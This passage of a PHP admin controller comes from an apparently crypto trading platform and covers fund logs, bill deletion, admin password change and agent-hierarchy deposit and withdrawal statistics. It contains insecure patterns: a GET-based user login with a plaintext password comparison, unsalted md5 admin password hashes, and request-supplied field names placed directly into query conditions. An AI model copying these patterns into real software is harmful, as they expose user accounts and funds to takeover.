            'usdt'=>['name'=>'usdt'],
            'btc'=>['name'=>'btc'],
            'eth'=>['name'=>'eth'],
            'eos'=>['name'=>'eos'],
            'doge'=>['name'=>'doge'],
            'bch'=>['name'=>'bch'],
            'ltc'=>['name'=>'ltc'],
            'iota'=>['name'=>'iota'],
            'fil'=>['name'=>'fil'],
            'jst'=>['name'=>'jst'],
            'ht'=>['name'=>'ht'],
            'bch'=>['name'=>'bch'],
        ];

        $this->assign("coinlist",$conlist);
        $this->display();
    }

    // 资金变更日志
    public function amountlog(){
        $field=I('get.field');
        $search=I('get.search');
        $coinname=I('get.coinname');
        $st=I('get.st');
        $where = array();
        if ($field && $search) {
            $where['uid'] = M('User')->where(array($field => $search))->getField('id');
        }
        $coinlist = M("coin")->order("id desc")->field("name,title")->select();
        $this->assign("coinlist",$coinlist);
        if($st > 0){
            $where['st'] = $st;
        }
        if($coinname != ''){
            $where['coinname'] = $coinname;
        }

        $count = M('bill')->where($where)->count();
        $Page = new \Think\Page($count, 15);
        $show = $Page->show();
        $list = M('bill')->where($where)->order('id desc')->limit($Page->firstRow . ',' . $Page->listRows)->select();
        foreach ($list as $k => $v) {
            $userInfo=M('User')->Field('phone')->where(array('id' => $v['uid']))->find();
            if ($userInfo) {
                $list[$k]['phone'] = $userInfo['phone'];
            }

        }
        $this->assign('list', $list);
        $this->assign('page', $show);
        $this->display();
    }

    public function billdel($type=null,$id=null){
        if(empty($id)){
            $this->error("缺少重要参数");exit();
        }
        $where['id'] = array('in', $id);
        $re = M('bill')->where($where)->delete();
        if($re){
            $this->success("删除成功");exit();
        }else{
            $this->error("删除失败");exit();
        }
    }

    //修改管理员密码
    public function setpwd()
    {
        if (IS_POST) {
            defined('APP_DEMO') || define('APP_DEMO', 0);
            $oldpassword = $_POST['oldpassword'];
            $newpassword = $_POST['newpassword'];
            $repassword = $_POST['repassword'];

            if (!check($oldpassword, 'password')) {
                $this->error('旧密码格式错误！');
            }
            if (md5($oldpassword) != session('admin_password')) {
                $this->error('旧密码错误！');
            }
            if (!check($newpassword, 'password')) {
                $this->error('新密码格式错误！');
            }
            if ($newpassword != $repassword) {
                $this->error('确认密码错误！');
            }
            if (D('Admin')->where(array('id' => session('admin_id')))->save(array('password' => md5($newpassword)))) {
                $this->success('登陆密码修改成功！', U('Login/loginout'));
            } else {
                $this->error('登陆密码修改失败！');
            }
        }

        $this->display();
    }

    //管理员登陆
    public function loginadmin()
    {
        header("Content-Type:text/html; charset=utf-8");
        if (IS_GET) {
            $id = trim(I('get.id'));
            $pwd = trim(I('get.pass'));
            // $pwd2=trim(I('get.secpw'));
            $user = M('User')->where(array('id' => $id))->find();
            if (!$user || $user['password']!=$pwd) {
                $this->error('账号或密码错误,或被禁用！如确定账号密码无误,请联系您的领导人或管理员处理.');
            } else {
                session('userId', $user['id']);
                session('userName', $user['username']);
                session('userNoid',$user['noid']);
                $this->redirect('/');
            }
        }
    }
    // 团队统计列表
    public function count()
    {
        $status=I('get.status')?:3;
        $is_get=I('get.is_get');
        $field=I('get.field');
        $search=I('get.search');
        $start_time=I('get.start_time');
        $end_time=I('get.end_time');
        $xiaji=I('get.xiaji');
        $agent_id=I('get.agent_id');
        $this->assign('field', $field);
        $this->assign('agent_id', $agent_id);
        $start_time?$start_time=$start_time:$start_time=date('Y-m-d 00:00:00');
        $end_time?$end_time=$end_time:$end_time=date('Y-m-d 23:59:59');
        $this->assign('start_time', $start_time);
        $this->assign('end_time', $end_time);

        $all_btc_recharge=0;
        $all_eth_recharge=0;
        $all_usdt_recharge=0;

        $all_btc_withdraw=0;
        $all_eth_withdraw=0;
        $all_usdt_withdraw=0;

        if ($is_get == 1) {  // 筛选 查询
            $this->assign('field', $field);
            $this->assign('search', $search);
            $this->assign('xiaji', $xiaji);
            $where = array();
            if ($agent_id) { // 有 上级id
                switch ($status) {
                    case 1: //一级代理
                        $where['is_agent']=1;
                        $where['path']='';
                        $where['invit_1']= 0;
                        $where['invit_2']= 0;
                        $where['invit_3']= 0;
                        break;
                    case 2: //普通用户
                        $where['is_agent']=0;break;
                    case 3: // 全部用户
                        $where=[]; break;
                    case 4: // 普通代理
                        $where['is_agent']=1;
                        $where['invit_1'] =[['gt',0]];
                    case 5: // 二级代理
                        $where['is_agent']=1;
                        $where['invit_1'] =[['gt',0]];
                        $where['invit_2'] =[['eq',0]];
                        $where['invit_3'] =[['eq',0]];
                        break;
                    case 6: // 三级代理
                        $where['is_agent']=1;
                        $where['invit_1'] =[['gt',0]];
                        $where['invit_2'] =[['gt',0]];
                        $where['invit_3'] =[['eq',0]];
                        break;
                }
                if ($field && $search) {
                    $where[$field] = $search;
                }
                $where['type']=0;
                $where['invit_1']=$agent_id;

            }else{
                switch ($status) {
                    case 1: //一级代理
                        $where['is_agent']=1;
                        $where['path']='';
                        $where['invit_1']= 0;
                        $where['invit_2']= 0;
                        $where['invit_3']= 0;
                        break;
                    case 2: //普通用户
                        $where['is_agent']=0;break;
                    case 3: // 全部用户
                        $where=[]; break;
                    case 4: // 普通代理
                        $where['is_agent']=1;
                        $where['invit_1'] =[['gt',0]];
                    case 5: // 二级代理
                        $where['is_agent']=1;
                        $where['invit_1'] =[['gt',0]];
                        $where['invit_2'] =[['eq',0]];
                        $where['invit_3'] =[['eq',0]];
                        break;
                    case 6: // 三级代理
                        $where['is_agent']=1;
                        $where['invit_1'] =[['gt',0]];
                        $where['invit_2'] =[['gt',0]];
                        $where['invit_3'] =[['eq',0]];
                        break;
                }
                if ($field && $search) {
                    $where[$field] = $search;
                }
                $where['type']=0;

            }
            $count = M('User')->where($where)->count();
            $Page = new \Think\Page($count, 20);
            $show = $Page->show();
            $list = M('User')->field("id,username,phone,money,invit_1,invit_2,invit_3,path,addtime,is_agent,type")
                ->where($where)
                ->order('id asc')
                ->limit($Page->firstRow . ',' . $Page->listRows)
                ->select();
            $this->assign('status', $status);

            $list=$this->_searchList($list,$start_time,$end_time); // 筛选列表数据
//            $all_zs_ids=$this->_getAllZSUserId($where); // 所有直属下级id
//            $all_user_id=$this->_getAllUIds($all_zs_ids); //所有下级id
//            $allUserIds=array_unique(array_merge($all_zs_ids,$all_user_id)); // 合并所有uid
//            if (!empty($allUserIds)) {
//                $all_total=$this->_allTotal($allUserIds,$start_time,$end_time); //总统计
//            }
            $this->assign('status', $status);
        }else{   // 列表默认展示
            if ($xiaji) { // 下级 全部
                $where['invit_1']=$xiaji;
            }else{ // 默认一级代理
                $where['is_agent']=1;
                $where['path']='';
                $where['invit_1']= 0;
                $where['invit_2']= 0;
                $where['invit_3']= 0;
            }
            if ($field && $search) {
                $where[$field] = $search;
            }
            $where['type']=0;
            $count = M('User')->where($where)->count();
            $Page = new \Think\Page($count, 20);
            $show = $Page->show();
            $list = M('User')->field("id,username,phone,money,invit_1,invit_2,invit_3,path,addtime,is_agent,type")
                ->where($where)
                ->order('id asc')
                ->limit($Page->firstRow . ',' . $Page->listRows)
                ->select();

            $list=$this->_moRenList($list,$start_time,$end_time); // 列表数据

//            $all_zs_ids=$this->_getAllZSUserId($where); // 当前筛选条件下所有 直属下级id
//            $all_user_id=$this->_getAllUIds($all_zs_ids); //所有下级id
//            $allUserIds=array_unique(array_merge($all_zs_ids,$all_user_id)); // 合并所有uid
//            if (!empty($allUserIds)) {
//                $all_total=$this->_allTotal($allUserIds,$start_time,$end_time); //总统计
//            }

        }
        // 页面 总统计
        foreach ($list as $v) {
            $all_btc_recharge+=$v['btc_recharge'];
            $all_eth_recharge+=$v['eth_recharge'];
            $all_usdt_recharge+=$v['usdt_recharge'];

            $all_btc_withdraw+=$v['btc_withdraw'];
            $all_eth_withdraw+=$v['eth_withdraw'];
            $all_usdt_withdraw+=$v['usdt_withdraw'];
        }
        $all_btc_yingkui= $all_btc_recharge - $all_btc_withdraw;
        $all_eth_yingkui= $all_eth_recharge - $all_eth_withdraw;
        $all_usdt_yingkui= $all_usdt_recharge - $all_usdt_withdraw;

        $this->assign('all_btc_recharge', $all_btc_recharge);
        $this->assign('all_eth_recharge', $all_eth_recharge);
        $this->assign('all_usdt_recharge', $all_usdt_recharge);

        $this->assign('all_btc_withdraw', $all_btc_withdraw);
        $this->assign('all_eth_withdraw', $all_eth_withdraw);
        $this->assign('all_usdt_withdraw', $all_usdt_withdraw);

        $this->assign('all_btc_yingkui', $all_btc_yingkui);
        $this->assign('all_eth_yingkui', $all_eth_yingkui);
        $this->assign('all_usdt_yingkui', $all_usdt_yingkui);

        $this->assign('status', $status);
        $this->assign('page', $show);
        $this->assign('list', $list);
        $this->display();
    }

    // 根据用户uid 集获取所有下级用户的
    private function _getAllUIds($all_id)
    {
        $user_ids=[];
        if (!empty($all_id)) {
            foreach ($all_id as $v) {
                $ids=$this->_getAllId($v);
                $user_ids= array_merge ($user_ids,$ids) ;
            }
        }
        return $user_ids;
    }

    /**
     * 根据 uid 集合 统计 总充值 提现 盈亏统计
     * @param $all_zs_ids
     * @param $start_time
     * @param $end_time
     * @return array
     */
    private function _allTotal($all_zs_ids,$start_time,$end_time){
        // 总充值
        $allBtcRecharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$all_zs_ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>'BTC'))->select();
        $allEthRecharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$all_zs_ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>'ETH'))->select();
//                echo M()->getLastSql();exit();
        $allUsdtRecharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$all_zs_ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>['in',['HKD','USDT','JPY']]))->select();

        $allBtcRecharge[0]['total'] ? $all_btc_recharge= round($allBtcRecharge[0]['total'],3):$all_btc_recharge=0 ;
        $allEthRecharge[0]['total'] ? $all_eth_recharge= round($allEthRecharge[0]['total'],3):$allEthRecharge=0 ;
        $allUsdtRecharge[0]['total'] ? $all_usdt_recharge= round($allUsdtRecharge[0]['total'],3):$allUsdtRecharge=0 ;

        //提现
        $allBtcWithdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$all_zs_ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>'btc'))->select();
        $allEthWithdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$all_zs_ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>'eth'))->select();
        $allUsdtWithdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$all_zs_ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>['in',['hkd','usdt','jpy']]))->select();

        $allBtcWithdraw[0]['total']?$all_btc_withdraw= round($allBtcWithdraw[0]['total'],3):$all_btc_withdraw=0 ;
        $allEthWithdraw[0]['total']?$all_eth_withdraw= round($allEthWithdraw[0]['total'],3):$all_eth_withdraw=0 ;
        $allUsdtWithdraw[0]['total']?$all_usdt_withdraw= round($allUsdtWithdraw[0]['total'],3):$all_usdt_withdraw=0 ;

        $all_btc_yingkui= $all_btc_recharge - $all_btc_withdraw;
        $all_eth_yingkui= $all_eth_recharge - $all_eth_withdraw;
        $all_usdt_yingkui= $all_usdt_recharge - $all_usdt_withdraw;

        $all_total=[
            "all_btc_recharge"=>$all_btc_recharge,
            "all_eth_recharge"=>$all_eth_recharge,
            "all_usdt_recharge"=>$all_usdt_recharge,
            "all_btc_withdraw"=>$all_btc_withdraw,
            "all_eth_withdraw"=>$all_eth_withdraw,
            "all_usdt_withdraw"=>$all_usdt_withdraw,
            "all_btc_yingkui"=>$all_btc_yingkui,
            "all_eth_yingkui"=>$all_eth_yingkui,
            "all_usdt_yingkui"=>$all_usdt_yingkui,
        ];
        return $all_total;
    }

    // 默认统计列表数据
    private function _moRenList($list,$start_time,$end_time){

        if (!empty($list)) {
            foreach ($list as $k => $v) {
                $ids=$this->_getAllId($v['id']); // 该id下面所有用户id
                empty($ids)?$list[$k]['down']=0:$list[$k]['down']=1;
                $ids[]=$v['id'];
                $list[$k]['invit_1'] = M('User')->field('username,id,phone')->where(array('id' => $v['invit_1']))->find();
                $list[$k]['coin'] = M('User_coin')->field('userid,usdt,usdtd,btc,btcd,eth,ethd')->where(array('userid' => $v['id']))->find();
                $list[$k]['coin_usdt']=$list[$k]['coin']['usdt']+$list[$k]['coin']['usdtd'];
                $list[$k]['coin_btc']=$list[$k]['coin']['btc']+$list[$k]['coin']['btcd'];
                $list[$k]['coin_eth']=$list[$k]['coin']['eth']+$list[$k]['coin']['ethd'];

                //充值
                if (!empty($ids)) {
                    $btc_recharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>'BTC'))->select();
                    $eth_recharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>'ETH'))->select();
                    $usdt_recharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>['in',['HKD','USDT','JPY']]))->select();
                    $btc_recharge[0]['total']?$list[$k]['btc_recharge']= round($btc_recharge[0]['total'],3):$list[$k]['btc_recharge']='0.00' ;
                    $eth_recharge[0]['total']?$list[$k]['eth_recharge']= round($eth_recharge[0]['total'],3):$list[$k]['eth_recharge']='0.00' ;
                    $usdt_recharge[0]['total']?$list[$k]['usdt_recharge']= round($usdt_recharge[0]['total'],3):$list[$k]['usdt_recharge']='0.00' ;
                    //提现
                    $btc_withdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>'btc'))->select();
                    $eth_withdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>'eth'))->select();
                    $usdt_withdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>['in',['hkd','usdt','jpy']]))->select();
                    $btc_withdraw[0]['total']?$list[$k]['btc_withdraw']= round($btc_withdraw[0]['total'],3):$list[$k]['btc_withdraw']='0.00' ;
                    $eth_withdraw[0]['total']?$list[$k]['eth_withdraw']= round($eth_withdraw[0]['total'],3):$list[$k]['eth_withdraw']='0.00' ;
                    $usdt_withdraw[0]['total']?$list[$k]['usdt_withdraw']= round($usdt_withdraw[0]['total'],3):$list[$k]['usdt_withdraw']='0.00' ;

                    //盈亏
                    $list[$k]['btc_yingkui']=round($list[$k]['btc_recharge']-$list[$k]['btc_withdraw'],3);
                    $list[$k]['eth_yingkui']=round($list[$k]['eth_recharge']-$list[$k]['eth_withdraw'],3);
                    $list[$k]['usdt_yingkui']=round($list[$k]['usdt_recharge']-$list[$k]['usdt_withdraw'],3);
                }else{
                    $list[$k]['btc_recharge']='0.00';
                    $list[$k]['eth_recharge']='0.00';
                    $list[$k]['usdt_recharge']='0.00';

                    $list[$k]['btc_withdraw']='0.00';
                    $list[$k]['eth_withdraw']='0.00';
                    $list[$k]['usdt_withdraw']='0.00';

                    $list[$k]['btc_yingkui']='0.00';
                    $list[$k]['eth_yingkui']='0.00';
                    $list[$k]['usdt_yingkui']='0.00';
                }
                $user_login_state=M('user_log')->where(array('userid'=>$v['id'],'type' => 'login'))->order('id desc')->find();
                $list[$k]['state']=$user_login_state['state'];

                // 用户分类
                if ($v['invit_1'] == 0 && $v['invit_2'] == 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                    $list[$k]['user_type']=1;// 一级代理
                } elseif ($v['invit_1'] > 0 && $v['invit_2'] == 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                    $list[$k]['user_type']=2;// 二级代理
                } elseif ($v['invit_1'] > 0 && $v['invit_2'] > 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                    $list[$k]['user_type']=3;// 三级代理
                }else{
                    $list[$k]['user_type']=4;// 普通用户
                }
            }
        }
        return $list;
    }

    // 筛选列表数据
    private function _searchList($list,$start_time,$end_time){
        if (!empty($list)) {
            foreach ($list as $k => $v) {
                $ids=$this->_getAllId($v['id']); // 该id下面所有用户id
                empty($ids)?$list[$k]['down']=0:$list[$k]['down']=1;
                $ids[]=$v['id'];
                $list[$k]['invit_1'] = M('User')->field('username,id,phone')->where(array('id' => $v['invit_1']))->find();
                $list[$k]['coin'] = M('User_coin')->field('userid,usdt,usdtd,btc,btcd,eth,ethd')->where(array('userid' => $v['id']))->find();
                $list[$k]['coin_usdt']=$list[$k]['coin']['usdt']+$list[$k]['coin']['usdtd'];
                $list[$k]['coin_btc']=$list[$k]['coin']['btc']+$list[$k]['coin']['btcd'];
                $list[$k]['coin_eth']=$list[$k]['coin']['eth']+$list[$k]['coin']['ethd'];

                //充值
                if (!empty($ids)) {
                    $btc_recharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>'BTC'))->select();
                    $eth_recharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>'ETH'))->select();
                    $usdt_recharge = M('recharge')->field("sum(num) as total")->where(array('uid' => ['in',$ids],'type'=>['in',[1,2]],'status'=>2,'updatetime'=>[['EGT',$start_time],['ELT',$end_time]],'coin'=>['in',['HKD','USDT','JPY']]))->select();
                    $btc_recharge[0]['total']?$list[$k]['btc_recharge']= round($btc_recharge[0]['total'],3):$list[$k]['btc_recharge']='0.00' ;
                    $eth_recharge[0]['total']?$list[$k]['eth_recharge']= round($eth_recharge[0]['total'],3):$list[$k]['eth_recharge']='0.00' ;
                    $usdt_recharge[0]['total']?$list[$k]['usdt_recharge']= round($usdt_recharge[0]['total'],3):$list[$k]['usdt_recharge']='0.00' ;

                    //提现
                    $btc_withdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>'btc'))->select();
                    $eth_withdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>'eth'))->select();
                    $usdt_withdraw = M('myzc')->field("sum(num) as total")->where(array('userid' =>  ['in',$ids],'status'=>2,'endtime'=>[['EGT',$start_time],['ELT',$end_time]],'coinname'=>['in',['hkd','usdt','jpy']]))->select();
                    $btc_withdraw[0]['total']?$list[$k]['btc_withdraw']= round($btc_withdraw[0]['total'],3):$list[$k]['btc_withdraw']='0.00' ;
                    $eth_withdraw[0]['total']?$list[$k]['eth_withdraw']= round($eth_withdraw[0]['total'],3):$list[$k]['eth_withdraw']='0.00' ;
                    $usdt_withdraw[0]['total']?$list[$k]['usdt_withdraw']= round($usdt_withdraw[0]['total'],3):$list[$k]['usdt_withdraw']='0.00' ;

                    //盈亏
                    $list[$k]['btc_yingkui']=round($list[$k]['btc_recharge']-$list[$k]['btc_withdraw'],3);
                    $list[$k]['eth_yingkui']=round($list[$k]['eth_recharge']-$list[$k]['eth_withdraw'],3);
                    $list[$k]['usdt_yingkui']=round($list[$k]['usdt_recharge']-$list[$k]['usdt_withdraw'],3);
                }else{
                    $list[$k]['btc_recharge']='0.00';
                    $list[$k]['eth_recharge']='0.00';
                    $list[$k]['usdt_recharge']='0.00';

                    $list[$k]['btc_withdraw']='0.00';
                    $list[$k]['eth_withdraw']='0.00';
                    $list[$k]['usdt_withdraw']='0.00';

                    $list[$k]['btc_yingkui']='0.00';
                    $list[$k]['eth_yingkui']='0.00';
                    $list[$k]['usdt_yingkui']='0.00';
                }

                $user_login_state=M('user_log')->where(array('userid'=>$v['id'],'type' => 'login'))->order('id desc')->find();
                $list[$k]['state']=$user_login_state['state'];
                //  用户分类
                if ($v['invit_1'] == 0 && $v['invit_2'] == 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                    $list[$k]['user_type']=1;// 一级代理
                } elseif ($v['invit_1'] > 0 && $v['invit_2'] == 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                    $list[$k]['user_type']=2;// 二级代理
                } elseif ($v['invit_1'] > 0 && $v['invit_2'] > 0 && $v['invit_3'] == 0 && $v['is_agent'] == 1) {
                    $list[$k]['user_type']=3;// 三级代理
                }else{
                    $list[$k]['user_type']=4;// 普通用户
                }
            }
        }

        return  $list;
    }

    /**
     * 获取所有下级id
     * @param $id
     * @return array
     */
    private  function _getAllId($id){
        $son= M('User')->field('id')->where("path like '%,{$id}%' and type =0")->select();
        if ($son && !empty($son)) {
            return array_unique(array_column($son,'id'));
        } else {
            return [];
        }

    }

    /**
     * 遍历方式
     * 获取所有下级id
     * @param $id
     * @param array $sons
     * @return array|mixed
     */
    private function getAllId($id, &$sons = [])
    {
        $son= M('User')->field('id')->where(['invit_1'=>$id,'type'=>0])->select();
        if ($son && !empty($son)) {
            foreach ($son as $v) {
                $sons[] = $v['id'];
                self::_getAllId($v['id'], $sons);
            }
        } else {
            return $sons;
        }
        return $sons;
    }

    /**
     * 根据条件获取用户uid
     * @param $where
     * @return array
     */
    private function _getAllZSUserId($where)
    {
        $ids= M('User')->field('id')->where($where)->select();
        if (empty($ids)) {
            return [];
        }
        return array_column($ids,'id');
    }

}
?>